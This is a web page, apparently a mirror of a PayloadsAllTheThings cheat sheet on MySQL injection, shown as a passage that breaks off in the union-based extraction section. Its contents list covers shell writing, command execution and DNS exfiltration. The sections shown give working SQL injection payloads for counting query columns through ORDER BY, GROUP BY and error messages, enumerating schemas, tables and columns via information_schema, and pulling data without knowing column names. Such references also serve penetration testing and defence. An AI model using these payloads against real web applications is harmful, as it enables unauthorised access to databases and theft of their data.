<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="MYSQL Injection" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Summary" />
<meta property="og:description" content="Summary" />
<link rel="canonical" href="http://localhost:4000/MySQL-Injection/" />
<meta property="og:url" content="http://localhost:4000/MySQL-Injection/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-10-29T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="MYSQL Injection" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"MYSQL Injection","dateModified":"2020-10-29T00:00:00+07:00","datePublished":"2020-10-29T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/MySQL-Injection/"},"url":"http://localhost:4000/MySQL-Injection/","description":"Summary","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>MYSQL Injection | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>MYSQL Injection</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>MYSQL Injection</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Thu, Oct 29, 2020, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    Oct 29, 2020
  

  <i class="unloaded">2020-10-29T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2168 words">12 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h2 id="summary">Summary</h2>

<ul>
  <li><a href="#mysql-comment">MYSQL Comment</a></li>
  <li><a href="#mysql-union-based">MYSQL Union Based</a>
    <ul>
      <li><a href="#detect-columns-number">Detect columns number</a></li>
      <li><a href="#extract-database-with-information_schema">Extract database with information_schema</a></li>
      <li><a href="#extract-columns-name-without-information_schema">Extract columns name without information_schema</a></li>
      <li><a href="#extract-data-without-columns-name">Extract data without columns name</a></li>
    </ul>
  </li>
  <li><a href="#mysql-error-based">MYSQL Error Based</a>
    <ul>
      <li><a href="#mysql-error-based---basic">MYSQL Error Based - Basic</a></li>
      <li><a href="#mysql-error-based---updatexml-function">MYSQL Error Based - UpdateXML function</a></li>
      <li><a href="#mysql-error-based---extractvalue-function">MYSQL Error Based - Extractvalue function</a></li>
    </ul>
  </li>
  <li><a href="#mysql-blind">MYSQL Blind</a>
    <ul>
      <li><a href="#mysql-blind-with-substring-equivalent">MYSQL Blind with substring equivalent</a></li>
      <li><a href="#mysql-blind-using-a-conditional-statement">MYSQL Blind using a conditional statement</a></li>
      <li><a href="#mysql-blind-with-make_set">MYSQL Blind with MAKE_SET</a></li>
      <li><a href="#mysql-blind-with-like">MYSQL Blind with LIKE</a></li>
    </ul>
  </li>
  <li><a href="#mysql-time-based">MYSQL Time Based</a>
    <ul>
      <li><a href="#using-sleep-in-a-subselect">Using SLEEP in a subselect</a></li>
      <li><a href="#using-conditional-statements">Using conditional statements</a></li>
    </ul>
  </li>
  <li><a href="#mysql-dios---dump-in-one-shot">MYSQL DIOS - Dump in One Shot</a></li>
  <li><a href="#mysql-current-queries">MYSQL Current queries</a></li>
  <li><a href="#mysql-read-content-of-a-file">MYSQL Read content of a file</a></li>
  <li><a href="#mysql-write-a-shell">MYSQL Write a shell</a>
    <ul>
      <li><a href="#into-outfile-method">Into outfile method</a></li>
      <li><a href="#into-dumpfile-method">Into dumpfile method</a></li>
    </ul>
  </li>
  <li><a href="#mysql-udf-command-execution">MYSQL UDF command execution</a></li>
  <li><a href="#mysql-truncation">MYSQL Truncation</a></li>
  <li><a href="#mysql-fast-exploitation">MYSQL Fast Exploitation</a></li>
  <li><a href="#mysql-out-of-band">MYSQL Out of band</a>
    <ul>
      <li><a href="#dns-exfiltration">DNS exfiltration</a></li>
      <li><a href="#unc-path---ntlm-hash-stealing">UNC Path - NTLM hash stealing</a></li>
    </ul>
  </li>
  <li><a href="#references">References</a></li>
</ul>

<h2 id="mysql-comment">MYSQL comment</h2>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="o">#</span> <span class="n">MYSQL</span> <span class="k">Comment</span>
<span class="c1">-- comment [Note the space after the double dash]</span>
<span class="cm">/* MYSQL Comment */</span>
<span class="cm">/*! MYSQL Special SQL */</span>
<span class="cm">/*!32302 10*/</span> <span class="k">Comment</span> <span class="k">for</span> <span class="n">MYSQL</span> <span class="k">version</span> <span class="mi">3</span><span class="p">.</span><span class="mi">23</span><span class="p">.</span><span class="mi">02</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-union-based">MYSQL Union Based</h2>

<h3 id="detect-columns-number">Detect columns number</h3>

<p>First you need to know the number of columns</p>

<h5 id="using-order-by-or-group-by">Using <code class="language-plaintext highlighter-rouge">order by</code> or <code class="language-plaintext highlighter-rouge">group by</code></h5>

<p>Keep incrementing the number until you get a False response.
Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' ORDER BY 1--+	#True
1'</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">2</span><span class="c1">--+	#True</span>
<span class="mi">1</span><span class="s1">' ORDER BY 3--+	#True
1'</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">4</span><span class="c1">--+	#False - Query is only using 3 columns</span>
                        <span class="o">#-</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,3--+	True
</span></pre></td></tr></tbody></table></code></div></div>
<p>or</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' GROUP BY 1--+	#True
1'</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="mi">2</span><span class="c1">--+	#True</span>
<span class="mi">1</span><span class="s1">' GROUP BY 3--+	#True
1'</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="mi">4</span><span class="c1">--+	#False - Query is only using 3 columns</span>
                        <span class="o">#-</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,3--+	True
</span></pre></td></tr></tbody></table></code></div></div>
<h5 id="using-order-by-or-group-by-error-based">Using <code class="language-plaintext highlighter-rouge">order by</code> or <code class="language-plaintext highlighter-rouge">group by</code> Error Based</h5>
<p>Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled.</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# Unknown column '</span><span class="mi">4</span><span class="s1">' in '</span><span class="k">order</span> <span class="n">clause</span><span class="s1">'
# This error means query uses 3 column
#-1'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--+	True</span>
</pre></td></tr></tbody></table></code></div></div>
<p>or</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# Unknown column '</span><span class="mi">4</span><span class="s1">' in '</span><span class="k">group</span> <span class="k">statement</span><span class="s1">'
# This error means query uses 3 column
#-1'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--+	True</span>
</pre></td></tr></tbody></table></code></div></div>
<h5 id="using-union-select-error-based">Using <code class="language-plaintext highlighter-rouge">UNION SELECT</code> Error Based</h5>
<p>This method works if error showing is enabled</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' UNION SELECT @--+        #The used SELECT statements have a different number of columns
1'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">@</span><span class="p">,</span><span class="o">@</span><span class="c1">--+      #The used SELECT statements have a different number of columns</span>
<span class="mi">1</span><span class="s1">' UNION SELECT @,@,@--+    #No error means query uses 3 column
                            #-1'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--+	True</span>
</pre></td></tr></tbody></table></code></div></div>
<h5 id="using-limit-into-error-based">Using <code class="language-plaintext highlighter-rouge">LIMIT INTO</code> Error Based</h5>
<p>This method works if error showing is enabled.</p>

<p>It is useful for finding the number of columns when the injection point is after a LIMIT clause.</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
1'</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">INTO</span> <span class="o">@</span><span class="p">,</span><span class="o">@</span><span class="c1">--+      #The used SELECT statements have a different number of columns</span>
<span class="mi">1</span><span class="s1">' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column
                              #-1'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--+	True</span>
</pre></td></tr></tbody></table></code></div></div>
<h5 id="using-select--from-some_existing_table-error-based">Using <code class="language-plaintext highlighter-rouge">SELECT * FROM SOME_EXISTING_TABLE</code> Error Based</h5>
<p>This works if you know the table name you’re after and error showing is enabled.</p>

<p>It will return the amount of columns in the table, not the query.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
                                        # This error means query uses 3 column
                                        #-1'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--+	True</span>
</pre></td></tr></tbody></table></code></div></div>
<h3 id="extract-database-with-information_schema">Extract database with information_schema</h3>

<p>Then the following codes will extract the databases’name, tables’name, columns’name.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">UniOn</span> <span class="k">Select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,...,</span><span class="n">gRoUp_cOncaT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7c</span><span class="p">,</span><span class="k">schema_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x7c</span><span class="p">)</span><span class="o">+</span><span class="k">fRoM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span>
<span class="k">UniOn</span> <span class="k">Select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,...,</span><span class="n">gRoUp_cOncaT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7c</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x7C</span><span class="p">)</span><span class="o">+</span><span class="k">fRoM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="o">+</span><span class="k">wHeRe</span><span class="o">+</span><span class="n">table_schema</span><span class="o">=</span><span class="p">...</span>
<span class="k">UniOn</span> <span class="k">Select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,...,</span><span class="n">gRoUp_cOncaT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7c</span><span class="p">,</span><span class="k">column_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x7C</span><span class="p">)</span><span class="o">+</span><span class="k">fRoM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="o">+</span><span class="k">wHeRe</span><span class="o">+</span><span class="k">table_name</span><span class="o">=</span><span class="p">...</span>
<span class="k">UniOn</span> <span class="k">Select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,...,</span><span class="n">gRoUp_cOncaT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7c</span><span class="p">,</span><span class="k">data</span><span class="p">,</span><span class="mi">0</span><span class="n">x7C</span><span class="p">)</span><span class="o">+</span><span class="k">fRoM</span><span class="o">+</span><span class="p">...</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="extract-columns-name-without-information_schema">Extract columns name without information_schema</h3>

<p>Method for <code class="language-plaintext highlighter-rouge">MySQL &gt;= 4.1</code>.</p>

<p>First extract the column number with</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">and</span><span class="p">(</span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">db</span><span class="p">.</span><span class="n">users</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="c1">-- Operand should contain 4 column(s)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then extract the column name.</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">db</span><span class="p">.</span><span class="n">users</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">)</span>
<span class="c1">--Column 'id' cannot be null</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Method for <code class="language-plaintext highlighter-rouge">MySQL 5</code></p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="o">-</span><span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">JOIN</span> <span class="n">users</span> <span class="n">b</span><span class="p">)</span><span class="n">a</span>
<span class="c1">--#1060 - Duplicate column name 'id'</span>

<span class="o">-</span><span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">JOIN</span> <span class="n">users</span> <span class="n">b</span> <span class="k">USING</span><span class="p">(</span><span class="n">id</span><span class="p">))</span><span class="n">a</span>
<span class="c1">-- #1060 - Duplicate column name 'name'</span>

<span class="o">-</span><span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">JOIN</span> <span class="n">users</span> <span class="n">b</span> <span class="k">USING</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="n">name</span><span class="p">))</span><span class="n">a</span>
<span class="p">...</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="extract-data-without-columns-name">Extract data without columns name</h3>

<p>Extracting data from the 4th column without knowing its name.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="nv">`4`</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">)</span><span class="n">dbname</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Injection example inside the query <code class="language-plaintext highlighter-rouge">select author_id,title from posts where author_id=[INJECT_HERE]</code></p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
